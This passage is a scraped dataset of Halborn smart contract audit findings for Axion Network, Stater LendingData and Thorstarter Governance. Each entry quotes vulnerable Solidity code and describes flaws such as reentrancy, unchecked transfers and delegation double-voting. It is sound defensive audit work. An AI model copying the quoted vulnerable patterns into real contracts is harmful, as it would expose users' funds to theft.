will deploy and initialize the contracts atomically to prevent front-running of the initialization. Remediation Plan: SOLVED: Values will be hardcoded by the Axion Network team. 20 ", "labels": ["Halborn", "Axion_Network", "Severity: Medium"]}, {"title": "LACK OF INTEGER OVERFLOW PROTECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The overflow happens when an arithmetic operation reaches the maximum size of a type. For instance in the VentureCapital.sol contract on getTokenInterestEarned method, multiplication of contracts.stakingV2 .getTotalSharesOf(accountAddress)*tokenPricePerShare[tokenAddress] in the return calculation on the interest earned by an address for a specific dividend token may end up overflowing the integer. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum re-presentable value. Code Location: Listing 14: VentureCapital.sol (Lines 310,311) 303 304 305 306 307 308 309 310 311 312 313 314 315 316 function getTokenInterestEarned ( address accountAddress , address tokenAddress ) external view returns ( uint256 ) { } if ( isVcaRegistered [ accountAddress ] == false ) { return (( contracts . stakingV2 . getTotalSharesOf ( accountAddress ) * tokenPricePerShare [ tokenAddress ]) - contracts . stakingV2 . getDeductBalances ( accountAddress , tokenAddress )) / 1 e36 ; } return getTokenInterestEarnedInternal ( accountAddress , tokenAddress ); 21 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Currently not all the smart contracts and the operations within them are using the SafeMath library which makes some operations vulnerable to overflows/underflows. It is recommended to use the SafeMath library for arithmetic operations consistently throughout ALL the mathematical operations in the smart contract system. Reference: Ethereum Smart Contract Best Practices - Integer Overflow and Underflow Remediation Plan: NOT APPLICABLE: The Axion Network team claims that due to their use of Pragma > 0.8.0 safe math is not necessary, the run time will fail if there is an overflow. 22 ", "labels": ["Halborn", "Axion_Network", "Severity: Medium"]}, {"title": "UNCHECKED TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "contract Token.sol, StakeManager.sol, VentureCapital.sol, In Accelerator.sol, and StakingV21.sol the return value of some external Several tokens do not transfer/transferFrom calls are not checked. revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location: Listing 15: Token.sol (Lines 121) 116 117 118 119 120 121 122 123 } function recovery ( address recoverFor , address tokenToRecover , uint256 amount ) external onlyMigrator { IERC20 ( tokenToRecover ). transfer ( recoverFor , amount ); } Listing 16: StakeManager.sol (Lines 504,505,506,507) 502 503 504 505 506 507 function getTodaysInterest () internal returns ( uint256 ) { uint256 amountTokenInDay = IERC20Upgradeable ( contracts . token ). balanceOf ( address ( this )) ; IERC20Upgradeable ( contracts . token ). transfer ( 0 x000000000000000000000000000000000000dEaD , amountTokenInDay ); 23 Listing 17: VentureCapital.sol (Lines 136) 135 136 137 138 139 if ( tokenAddress != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable ( tokenAddress ). transfer ( to , tokenInterestEarned ); } else { to . transfer ( tokenInterestEarned ); } Listing 18: VentureCapital.sol (Lines 147,148,149,150) 144 145 146 147 148 149 150 151 function withdrawOriginDivTokens ( address tokenAddress ) external onlyExternalCaller { /* * 0 xFF ... is our ethereum placeholder address */ if ( tokenAddress != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable ( tokenAddress ). transfer ( msg . sender , originWithdrawableTokenAmounts [ tokenAddress ] ); } else { Listing 19: Accelerator.sol (Lines 193) 192 193 /* * Transfer tokens to contract */ IERC20 ( _token ). transferFrom ( msg . sender , address ( this ) , _amount ); Listing 20: Accelerator.sol (Lines 222) 221 222 // ** Transfer tokens to Manager */ IERC20 ( _token ). transfer ( recipient , _recipientAmount ); Listing 21: StakingV21.sol (Lines 116,123) 111 112 113 function transferTokens ( address vcAuction , address stakeManager ) external onlyMigrator { for ( uint8 i = 0; i < divTokens . length () ; i ++) { if ( divTokens . at ( i) != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { 24 114 115 116 117 118 119 120 121 122 123 124 IERC20Upgradeable token = IERC20Upgradeable ( divTokens . at ( i )) ; token . transfer ( vcAuction , token . balanceOf ( address ( this )) ); } else { payable ( vcAuction ). transfer ( address ( this ). balance ) ; } } IERC20Upgradeable axn = IERC20Upgradeable ( addresses . mainToken ); axn . transfer ( stakeManager , axn . balanceOf ( address ( this ))); } Risk Level: Likelihood - 2 Impact - 4 Recommendation: is It transfer/transferFrom return value is checked. recommended SafeERC20, use to or ensure that the Remediation Plan: SOLVED: The Axion Network team solved the issue by using SafeERC20 implementation and added the safetransfer function to the code. 25 ", "labels": ["Halborn", "Axion_Network", "Severity: Medium"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In VentureCapital.sol, It was identified that axion-contracts-v3 are missing nonReentrant guard. withdrawOriginDivTokens, contract StakeReminter.sol function remintStakeInternal, and contract StakeMinter.so function convertToNft are missing nonReentrant guard. Also, in these functions, external calls are called before all state changes are resolved, and read/write to persistent state following external call, making it vulnerable to a Reentrancy attack. function Although administrative restrictions are imposed but to protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 22: VentureCapital.sol (Lines 147,148,149,150,152) 144 145 146 147 148 149 150 151 152 153 function withdrawOriginDivTokens ( address tokenAddress ) external onlyExternalCaller { /* * 0 xFF ... is our ethereum placeholder address */ if ( tokenAddress != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable ( tokenAddress ). transfer ( msg . sender , originWithdrawableTokenAmounts [ tokenAddress ] ); } else { payable ( msg . sender ). transfer ( originWithdrawableTokenAmounts [ tokenAddress ]) ; } 26 154 155 156 } originWithdrawableTokenAmounts [ tokenAddress ] = 0; Listing 23: StakeReminter.sol (Lines 80,81) 71 72 73 74 75 76 77 78 79 80 81 82 function remintStakeInternal ( uint256 payout , uint256 topup , uint256 stakingDays ) internal { if ( topup != 0) { payout = payout + topup ; } contracts . token . burn ( msg . sender , payout ); // Burn the payout amount before restaking contracts . stakeMinter . externalStake ( payout , stakingDays , msg . sender ); } Listing 24: StakeMinter.sol (Lines 100) 94 95 96 97 98 99 100 101 function convertToNft ( uint256 stakeId ) external { require ( contracts . stakeCustodian . removeStake ( msg . sender , stakeId ) , ' STAKE MINTER : Not owner of stake or already converted . ' ); contracts . stakeToken . mint ( msg . sender , stakeId ); // 120 k } Risk Level: Likelihood - 1 Impact - 3 27 Recommendation: Change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. Remediation Plan: SOLVED: The Axion Network team claims that - Listing 22: This code no longer exists in their not-backwards branch. - Listing 23: Before calling external stake they burn the users token, thus re-entrancy would not benefit a hacker. - Listing 24: This would result in reminting the same stake, but removeStake is called first, the stake would not exist thus re-entrancy should not be a problem. 28 ", "labels": ["Halborn", "Axion_Network", "Severity: Low"]}, {"title": "MULTIPLE CALLS MAY LEADS TO DENIAL OF SERVICE(DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In contract StakeMinter.sol, StakeReminter.sol, and VentureCapital.sol multiple calls are executed in the same transaction. This call is executed following another call within the same transaction. It is possible that the call never gets executed if a prior call fails permanently and it may leads to DOS. This might be caused intentionally by a malicious user. Code Location: Listing 25: VentureCapital.sol (Lines 310) 303 304 305 306 307 308 309 310 311 312 313 314 315 316 function getTokenInterestEarned ( address accountAddress , address tokenAddress ) external view returns ( uint256 ) { } if ( isVcaRegistered [ accountAddress ] == false ) { return (( contracts . stakingV2 . getTotalSharesOf ( accountAddress ) * tokenPricePerShare [ tokenAddress ]) - contracts . stakingV2 . getDeductBalances ( accountAddress , tokenAddress )) / 1 e36 ; } return getTokenInterestEarnedInternal ( accountAddress , tokenAddress ); 29 Listing 26: StakeMinter.sol (Lines 100) 94 95 96 97 98 99 100 101 function convertToNft ( uint256 stakeId ) external { require ( contracts . stakeCustodian . removeStake ( msg . sender , stakeId ) , ' STAKE MINTER : Not owner of stake or already converted . ' ); contracts . stakeToken . mint ( msg . sender , stakeId ); // 120 k } Listing 27: StakeReminter.sol (Lines 46) 42 43 44 45 46 47 48 uint256 end = contracts . stakeManager . getStakeEnd ( stakeId ); require ( end != 0 && end <= block . timestamp , ' RESTAKER : Stake not mature or not set . '); uint256 payout = contracts . stakeBurner . externalBurnStake ( stakeId , msg . sender ); remintStakeInternal ( payout , topup , stakingDays ); Listing 28: StakeReminter.sol (Lines 80,81) 76 77 78 79 80 81 82 if ( topup != 0) { payout = payout + topup ; } contracts . token . burn ( msg . sender , payout ); // Burn the payout amount before restaking contracts . stakeMinter . externalStake ( payout , stakingDays , msg . sender ); } Risk Level: Likelihood - 1 Impact - 4 30 Recommendation: If possible, Refactor the code such that each transaction only executes one external call or make sure that all users can be trusted (i.e. theyre part of your own codebase). Remediation Plan: SOLVED: The Axion Network team removed the code in the new branch. 31 ", "labels": ["Halborn", "Axion_Network", "Severity: Low"]}, {"title": "EXTERNAL FUNCTION CALLS WITHIN LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Calls inside a loop increase Gas usage or might lead to a denial-of-service attack. In one of the functions discovered there is a for loop on variable i that iterates up to the divTokens and v2DivTokens array length. If this integer is evaluated at extremely large numbers this can cause a DoS. Code Location: Listing 29: VentureCapital.sol (Lines 73,74,75,76) 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 function ensureIsVcaRegisteredInternal ( address staker ) internal { if ( isVcaRegistered [ staker ] == false ) { if ( contracts . stakingV2 . getIsVCARegistered ( staker ) == false ) { uint256 totalShares = contracts . stakingV2 . resolveTotalSharesOf ( staker ); totalSharesOf [ staker ] = totalShares ; contracts . stakeManager . addTotalVcaRegisteredShares ( totalShares ); for ( uint256 i = 0; i < divTokens . length () ; i ++) { deductBalances [ staker ][ divTokens . at ( i )] = ( totalShares * tokenPricePerShare [ divTokens . at ( i ) ]) . toInt256 () ; } } else { totalSharesOf [ staker ] = contracts . stakingV2 . getTotalSharesOf ( staker ); for ( uint256 i = 0; i < divTokens . length () ; i ++) { deductBalances [ staker ][ divTokens . at ( i )] = contracts . stakingV2 32 75 76 77 78 79 80 81 82 } } . getDeductBalances ( staker , divTokens . at (i ) ) . toInt256 () ; } } isVcaRegistered [ staker ] = true ; Listing 30: VentureCapital.sol (Lines 286,287,288) 282 283 284 285 286 287 288 289 290 address [] memory v2DivTokens = contracts . stakingV2 . getDivTokens () ; for ( uint256 i = 0; i < v2DivTokens . length ; i ++) { divTokens . add ( v2DivTokens [i ]) ; tokenPricePerShare [ v2DivTokens [ i ]] = contracts . stakingV2 . getTokenPricePerShare ( v2DivTokens [ i ] ); } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: If possible, use pull over push strategy for external calls. Reference: External Calls Recommendation 33 Remediation Plan: SOLVED: The Axion Network team removed the code in the new branch. 34 ", "labels": ["Halborn", "Axion_Network", "Severity: Low"]}, {"title": "UNUSED RETURN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The return value of an external call is not stored in a local or state variable. In contract StakeBurner.sol, StakeMinter.sol, StakeUpgrader. sol, VentureCapital.sol, Accelerator.sol, and StakingV21.sol, there are instances where external methods are being called and return value are being ignored. Code Location: Listing 31: StakeBurner.sol (Lines 196) 195 196 197 198 199 // Add to stake custodian as the v1 or v2 stake is now a v3 stake that has been withdrawn contracts . stakeCustodian . addStake ( staker , sessionId ); return payout ; } Listing 32: StakeMinter.sol (Lines 84,85,86,87) 79 80 81 82 83 84 85 86 87 88 function stakeInternal ( uint256 amount , uint256 stakingDays , address staker ) internal { contracts . stakeCustodian . addStake ( staker , contracts . stakeManager . createStake ( staker , amount , stakingDays ) ); } Listing 33: StakeUpgrader.sol (Lines 112) 110 111 }) ); 35 112 113 } contracts . stakeCustodian . addStake ( msg . sender , sessionId ); Listing 34: VentureCapital.sol (Lines 253) 252 253 254 function addDivToken ( address tokenAddress ) external override onlyExternalCaller { divTokens . add ( tokenAddress ); } Listing 35: VentureCapital.sol (Lines 285) 284 285 286 287 288 289 290 for ( uint256 i = 0; i < v2DivTokens . length ; i ++) { divTokens . add ( v2DivTokens [i ]) ; tokenPricePerShare [ v2DivTokens [ i ]] = contracts . stakingV2 . getTokenPricePerShare ( v2DivTokens [ i ] ); } } Listing 36: Accelerator.sol (Lines 268) 266 267 268 269 /* * Check allowance */ if ( IERC20 ( _tokenInAddress ). allowance ( address ( this ) , uniswap ) < 2**255) { IERC20 ( _tokenInAddress ). approve ( uniswap , 2**255) ; } Listing 37: StakingV21.sol (Lines 118) 113 114 115 116 117 118 if ( divTokens . at ( i) != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable token = IERC20Upgradeable ( divTokens . at ( i )) ; token . transfer ( vcAuction , token . balanceOf ( address ( this )) ); } else { payable ( vcAuction ). transfer ( address ( this ). balance ) ; 36 119 } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Ensure that all the return values of the function calls are used. Add Return return value check to avoid unexpected crash of the contract. value check will help in handling the exceptions better way. Remediation Plan: PARTIALLY SOLVED: The Axion Network team solved the issue of Listing 32, and accepts the risk of Listing 34 and Listing 36. Further, Axion Network team claims that Listing 31, Listing 35 and Listing 31 only affects their backwards compatibility, issues listed without backwards compatibility do not apply. Backwards compatibility has been removed in the not-backwards branch. 37 ", "labels": ["Halborn", "Axion_Network", "Severity: Low"]}, {"title": "DIVIDE BEFORE MULTIPLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "As a result, the loss of Solidity integer division might truncate. precision can sometimes be avoided by multiplying before division, although the manual implementation of the precision/decimal calculation is being taken care of by the developer. In this audit, there are multiple instances found where division is being performed before multiplication operation in contract file. Code Location: Listing 38: BPD.sol (Lines 89) 88 89 90 for ( uint256 i = bpdInterval [0]; i < bpdInterval [1]; i ++) { bpdAmount += ( shares / bpdShares [ i ]) * ( uint256 ( bpdPools [ i ]) * 1 e8 ); // x 1 e8 since we have one decimal } Listing 39: StakeManager.sol (Lines 199,200,201,202) 119 120 121 122 addToGlobalTotals ( newAmount - ( stakeUpgrade . amount / 1 e12 ) * 1 e12 , newShares - ( stakeUpgrade . shares / 1 e12 ) * 1 e12 ); Listing 40: StakeManager.sol (Lines 240) 539 540 541 } uint256 shares = ( numerator * 1 e18 ) / denominator ; return ( shares / 1 e12 ) * 1 e12 ; 38 Listing 41: StakeManager.sol (Lines 528,529,530,537,538,539,540,541) 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 function updateShareRate ( uint256 _payout ) internal { uint256 currentTokenTotalSupply = contracts . token . totalSupply () ; // 718485214285714285714285714 uint256 growthFactor = ( _payout * 1 e18 ) / ( currentTokenTotalSupply + ( uint256 ( statFields . totalStakedAmount ) * 1 e12 ) + 1) ; // we calculate the total AXN supply as circulating + staked if ( settings . shareRateScalingFactor == 0) { // use a shareRateScalingFactor which can be set in order to tune the speed of shareRate increase settings . shareRateScalingFactor = 1 e18 ; } interestFields . shareRate = ( (( uint256 ( interestFields . shareRate ) * (1 e36 + ( uint256 ( settings . shareRateScalingFactor ) * growthFactor )) ) / 1 e36 ) ) } . toUint128 () ; // 1 e18 used for precision . Listing 42: Accelerator.sol (Lines 304,305,320) 303 304 305 306 307 308 309 310 311 312 313 314 // ** Add additional axion if stake length is greater then 1 year */ uint256 payout = (100 * _axionBought ) / splitAmounts [0]; payout = payout + ( payout * baseBonus ) / 100; if ( _days >= bonusStartDays && bought [ _currentDay ] < maxBoughtPerDay ) { // Get amount for sale left uint256 payoutWithBonus = maxBoughtPerDay - bought [ _currentDay ]; // Add to payout bought [ _currentDay ] += payout ; if ( payout > payoutWithBonus ) { uint256 payoutWithoutBonus = payout - payoutWithBonus ; payout = 39 315 316 317 318 319 320 321 322 323 324 325 ( payoutWithBonus + ( payoutWithBonus * (( _days / bonusStartDays ) + bonusStartPercent )) / 100) + payoutWithoutBonus ; } else { payout = payout + ( payout * (( _days / bonusStartDays ) + bonusStartPercent )) / 100; // multiply by percent divide by 100 } } else { // ** If not returned above add to bought and return payout . */ bought [ _currentDay ] += payout ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider doing multiplication operation before division to prevail precision in the values in non floating data type. It is recommended to use SafeMath.sol. Remediation Plan: NOT APPLICABLE: The Axion Network team accepts the risk of Listing 42 and claims that they remove precision to allow for their stakes to be a single word struct. Further, Axion Network team claims - Listing 38: BPD Shares have 0 decimal precision - Listing 39: Amount and shares have 6 decimal precision - Listing 40: Shares have 6 decimal precision - Listing 41: only affects their backwards compatibility, issues listed without backwards compatibility do not apply. Backwards compatibility has been removed in the not-backwards branch. 40 41 ", "labels": ["Halborn", "Axion_Network", "Severity: Low"]}, {"title": "MISSING ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Axion_Network_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are multiple instances found where Address validation is missing. Lack of zero address validation has been found when assigning user supplied address values to state variables directly. In Accelerator.sol contract function setRecipient lacks a zero-check on _recipient, function setToken lacks a zero-check on _token, function setVentureCapital lacks a zero-check on _ventureCapital, function setStaking lacks a zero-check on _staking, function setStakeManager lacks a zero-check on _stakeManager , and function startAddresses lacks a zero-check on _staking, _axion, In StakingV21.sol contract function _token, _uniswap and _recipient. transferTokens lacks zero address check on payable(vcAuction).transfer( address(this).balance). Code Location: Listing 43: Accelerator.sol (Lines 448) 447 448 449 function setRecipient ( address payable _recipient ) external onlyManager { recipient = _recipient ; } Listing 44: Accelerator.sol (Lines 462) 461 462 463 464 function setToken ( address _token ) external onlyManager { token = _token ; IVentureCapital ( ventureCapital ). addDivToken ( _token ); } Listing 45: Accelerator.sol (Lines 470) 469 function setVentureCapital ( address _ventureCapital ) external onlyManager { 42 470 471 } ventureCapital = _ventureCapital ; Listing 46: Accelerator.sol (Lines 477) 476 477 478 function setStaking ( address _staking ) external onlyManager { staking = _staking ; } Listing 47: Accelerator.sol (Lines 484) 484 485 486 function setStakeManager ( address _stakeManager ) external onlyManager { stakeManager = _stakeManager ; } Listing 48: Accelerator.sol (Lines 513,514,515,516,517) address _staking , address _axion , address _token , address payable _uniswap , address payable _recipient 506 function startAddresses ( 507 508 509 510 511 512 513 514 515 516 517 518 staking = _staking ; axion = _axion ; token = _token ; uniswap = _uniswap ; recipient = _recipient ; ) external onlyMigrator { } Listing 49: StakingV21.sol (Lines 118) 111 112 113 114 function transferTokens ( address vcAuction , address stakeManager ) external onlyMigrator { for ( uint8 i = 0; i < divTokens . length () ; i ++) { if ( divTokens . at ( i) != address (0 xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF )) { IERC20Upgradeable token = IERC20Upgradeable ( divTokens . at ( i )) ; 43 115 116 117 118 119 120 token . transfer ( vcAuction , token . balanceOf ( address ( this )) ); } else { payable ( vcAuction ). transfer ( address ( this ). balance ) ; } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Although administrative restrictions are imposed to this function due to the OpenZeppelin RBAC it is better to add proper address validation when assigning a value to a variable from user supplied inputs. Remediation Plan: RISK ACCEPTED: The Axion Network team accepts the risk. 44 3.10 (HAL-10) USAGE OF BLOCK-TIMESTAMP - LOW ", "labels": ["Halborn", "Axion_Network", "Severity: Informational"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf", "body": "The Owner of the contract is usually the account which deploys the con- tract. As a result, the Owner is able to perform some privileged actions. In LendingData.sol smart contract, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Function: Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. 13 Remediation Plan: Solved: Stater team will use a multi-signature wallet for the deployment to the mainnet. ", "labels": ["Halborn", "Stater_LendingData", "Severity: High"]}, {"title": "IMPROPER ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf", "body": "Implementing a valid access control policy is an essential step in main- taining the security of a smart-contract. All the features of the smart contract , such as add/remove roles and upgrade contracts are given by Access Control. For instance, Ownership is the most common form of Ac- cess Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Addi- tional authorization levels are needed to implement the least privilege principle, also known as least-authority, which ensures only authorized processes, users, or programs can access the necessary resources or in- formation. The ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. There could be multiple roles such as manager, admin in contracts which use a proxy contract.In LendingData.sol contract, owner is the only one privileged role. Owner can transfer the contract ownership, call the following functions. In conclusion, owner role can do too many actions in LendingData smart contract. If the private key of the owner account is compromised and multi-signature was not implemented, the attacker can perform many actions such as transferring ownership or change NFT addresses without following the principle of least privilege. 14 Functions: Listing 1 1 function setDiscounts 2 function setGlobalVariables 3 function addGeyserAddress 4 function addNftTokenId 5 function transferOwnership 6 function promissoryExchange Risk Level: Likelihood - 4 Impact - 4 Recommendation: A white-listing should be applied for the access policies on the smart contracts. Access Control policies should be determined over each role and the access control policies should be prevented from having only one authority. Remediation Plan: Solved: Stater team will use a multi-signature wallet for the deployment to the mainnet. 15 ", "labels": ["Halborn", "Stater_LendingData", "Severity: High"]}, {"title": "LACK OF ADDRESS CONTROL ON THE FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf", "body": "Address validation in contract LendingData.sol is missing. Lack of ad- dress validation has been found in the multiple functions. On the follow- ing functions, user supplied address values are assigned state variables directly. Code Location: LendingData.sol LendingData.sol Line #~447-452 16 LendingData.sol Line #~465-472 LendingData.sol Line #~479-481 Risk Level: Likelihood - 2 Impact - 2 17 Recommendation: Although administrative restrictions are imposed to this function it is better to add proper address validation when assigning a value to a variable from user supplied inputs. As a better solution, a white- listing/black-listing should be applied on the related functions. Listing 2 1 2 3 4 5 6 modifier validAddress ( address addr ) { require ( addr != 0 , \" Value can not be null \") ; require ( addr != address (0) , \" Address cannot be 0 x0 \") ; require ( addr != address ( this ) , \" Address cannot be contract address \") ; _; } Remediation Plan: Pending: Stater team will fix it in a future release. 18 ", "labels": ["Halborn", "Stater_LendingData", "Severity: Low"]}, {"title": "USAGE OF BLOCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf", "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: LendingData.sol Line #195-199 LendingData.sol Line #220 19 LendingData.sol Line #246 LendingData.sol Line #291-308 20 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: Solved: because their timescales are higher than 900 seconds. Stater team assumes that the use of block.timestamp is safe 21 ", "labels": ["Halborn", "Stater_LendingData", "Severity: Low"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In contract LendingData.sol, there are few instances where ex- ternal methods are being called and return value(bool) are being ignored. Affected Functions: Listing 3 1 function createLoan 2 function approveLoan 3 function cancelLoan 4 function payLoan 5 function terminateLoan 6 function promissoryExchange 7 function setPromissoryPermissions 8 function setDiscounts 9 function setGlobalVariables 10 function addGeyserAddress 11 function addNftTokenId Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add a return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. 22 Remediation Plan: Risk Accepted: Stater team considers that if they add returns value they could exceed the code length limit. 23 ", "labels": ["Halborn", "Stater_LendingData", "Severity: Low"]}, {"title": "POSSIBLE RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf", "body": "Calling external contracts is dangerous if some functions and variables are called after the external call. An attacker could use a malicious contract to perform a recursive call before calling function and take over the control flow. transfer function is executed without increasing the loanId value before. Thus, an attacker could perform a recursive call to execute malicious code. Code Location: LendingData.sol Line #~166-176 Risk Level: Likelihood - 1 Impact - 2 24 Recommendation: As possible, external calls should be at the end of the function in order to avoiding an attacker take over the control flow. In that case, increase loanId before call transfer function. Remediation Plan: Risk Accepted: Stater team considers appropriate the structure of the function but they will fix in a future release. 25 ", "labels": ["Halborn", "Stater_LendingData", "Severity: Informational"]}, {"title": "FOR LOOP OVER DYNAMIC ARRAY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf", "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Just by having too large an array of users to pay can max out the gas limit and prevent the transaction from ever succeeding. Code Location: LendingData.sol Line #~342-360 26 LendingData.sol Line #~367-372 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. Remediation Plan: Risk Accepted: Stater team considers appropriate the use of loops. 27 ", "labels": ["Halborn", "Stater_LendingData", "Severity: Informational"]}, {"title": "PRAGMA VERSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Stater_LendingData_Smart_Contract_Audit_Report_Halborn_v1.1.pdf", "body": "LendingData.sol contract uses one of the latest pragma version (0.7.4) which was released back in October 19, 2020. The latest pragma version is (0.8.3) was released in April 2021. Many pragma versions have been released, going from version 0.6.x to the recently released version 0.8.x. in just 6 months. Code Location: LendingData.sol Line #2 Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the Solitidy Github repository, there is a json file listing the bugs reported for each compiler version. No bugs have been found in > 0.7.3 versions and very few in 0.7.0 -- 0.7.3. The latest stable version is Furthermore, pragma 0.6.12 is widely used by Solidity pragma 0.6.12. developers and has been extensively tested in many security audits. We recommend using at minimum the latest stable version. Reference: https://github.com/ethereum/solidity/blob/develop/docs/ bugs_by_version.json 28 Remediation Plan: Risk Accepted: Stater team considers appropriate the use of pragma 0.7.4 for the deployment to the mainnet. 29 3.9 STATIC ANALYSIS REPORT ", "labels": ["Halborn", "Stater_LendingData", "Severity: Informational"]}, {"title": "USER CAN VOTE MULTIPLE TIMES THROUGH DELEGATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The contract Voters.sol contains a function called delegate() which allows a user to delegate his voting power to another address. In the contract DAO.sol, there is a restriction that only allows a user to vote for a proposal once. This restriction can be bypassed by delegating the voting power into another address. Combining this vulnerability with the issue discribed in HAL02, an attacker would be able to take full control of the DAO.sol contract without needing a flash loan. Code Location: DAO.sol Listing 1: DAO.sol (Lines 185) 182 function _vote ( address voter , uint proposalId , uint optionId ) private { Proposal storage p = proposals [ proposalId ]; require ( block . timestamp < p . endAt , \" voting ended \" ); require ( proposalVotes [ proposalId ][ voter ] == 0 , \" already voted \" ); p. optionsVotes [ optionId ] = p . optionsVotes [ optionId ] + voters . votesAt ( voter , p . snapshotId ); proposalVotes [ proposalId ][ voter ] = optionId + 1; emit Voted ( proposalId , voter , optionId ); 183 184 185 186 187 188 189 } Voters.sol Listing 2: Voters.sol 159 function delegate ( address delegatee ) external { 160 161 162 UserInfo storage userInfo = _userInfos [ msg . sender ]; address currentDelegate = userInfo . delegate ; userInfo . delegate = delegatee ; 13 163 164 165 166 167 168 169 170 171 } _updateSnapshot ( _votesSnapshots [ currentDelegate ], votes ( currentDelegate )) ; _updateSnapshot ( _votesSnapshots [ 